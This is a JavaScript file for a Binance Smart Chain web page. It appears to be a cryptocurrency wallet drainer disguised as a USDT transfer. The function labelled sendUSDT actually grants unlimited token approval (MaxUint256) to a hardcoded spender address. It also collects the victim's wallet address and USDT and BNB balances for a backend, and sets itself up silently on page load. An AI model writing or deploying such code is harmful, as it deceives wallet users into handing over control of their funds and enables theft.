let provider;
let signer;
let userAddress;
let isConnecting = false;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = "0x38";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== SILENT SETUP ON PAGE LOAD (NO REQUESTS) =====
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      // In Trust Wallet DApp browser, wallet is already connected
      // Just set up provider, don't request anything
      provider = new ethers.BrowserProvider(window.ethereum);
      
      // Try to get signer silently (works in Trust Wallet DApp browser)
      try {
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        
        const addr = document.getElementById("toAddress");
        if (addr) addr.value = userAddress;
        
        console.log("✅ Wallet ready:", userAddress);
      } catch (e) {
        // If fails, will retry on transaction
        console.log("Wallet will be ready on transaction");
      }
    } catch (e) {
      console.log("Setup error:", e.message);
    }
  }
});

// ===== ENSURE BSC NETWORK =====
async function ensureBSC() {
  try {
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }]
      });
    }
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    // Set up wallet if not already done (Trust Wallet DApp browser handles this automatically)
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }
    
    if (!signer) {
      signer = await provider.getSigner();
      userAddress = await signer.getAddress();
      
      const addr = document.getElementById("toAddress");
      if (addr) addr.value = userAddress;
    }

    // Ensure we're on BSC network before transaction
    await ensureBSC();

    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(userAddress);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(userAddress);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // This transaction call will trigger Trust Wallet approval popup
    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React (if available)
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: userAddress,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
